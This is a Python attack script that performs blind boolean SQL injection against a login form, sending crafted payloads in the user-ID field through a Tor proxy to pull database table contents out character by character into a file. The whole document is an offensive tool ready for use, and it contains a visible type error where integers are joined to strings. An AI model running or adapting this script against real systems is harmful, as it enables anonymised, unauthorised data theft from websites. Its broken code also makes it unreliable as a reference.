import time
import requests

url = "--target--"


#DO NOT CHANGE THIS PART
prox = {'http': "socks5://127.0.0.1:9050"}
rcookie = requests.get(url, proxies=prox)
cookies = {"PHPSESSID":rcookie.cookies['PHPSESSID']}
alphabet = [
"_",
"e","t","a","i","n","o","s","h","r","d","l","u","c","m","f","w","y","g","p","b","v","k","q","j","x","z",
#"E","T","A","I","N","O","S","H","R","D","L","U","C","M","F","W","Y","G","P","B","V","K","Q","J","X","Z",
#"0","1","2","3","4","5","6","7","8","9"
]

#DO NOT CHANGE THIS PART

out = open("out.txt","w")
localtime = time.asctime( time.localtime(time.time()) )
out.write(localtime+"\n")
out.close()
out = open("out.txt","a")

tablename = "df_collections"
columnname = "name"

isDataFinished = False
data = 0

correct = "p"


while True:
    char = 1
    temp = ""
    while not isDataFinished:
        for letter in alphabet:
            injection = "a' OR IF(HEX('"+letter+"')=HEX(SUBSTRING((SELECT "+columnname+" FROM "+tablename+" LIMIT 1 OFFSET "+data+"),"+char+",1)),1,'a'); -- "
            response = requests.post(
                url,
                cookies=cookies,
                data={
                'input_unique_id': injection,
                'input_pass': 'a',
                'btn_login': 'Submit',
                },
                verify=False,
                proxies=prox
            )
            if response.text[40]=='p':
                print("correct, char "+str(char)+": "+letter)
                out.write(letter)
                temp += letter
                char += 1
                break
        else:
            print("data done")
            out.write("\n")
            isDataFinished = True
    if temp=="":
        break
    data += 1
    isDataFinished = False
    print("Data "+str(data)+": "+temp)
    print("next data")
print("DONE\ndata count:"+str(data)+"\n")
localtime = time.asctime( time.localtime(time.time()) )
out.write(localtime)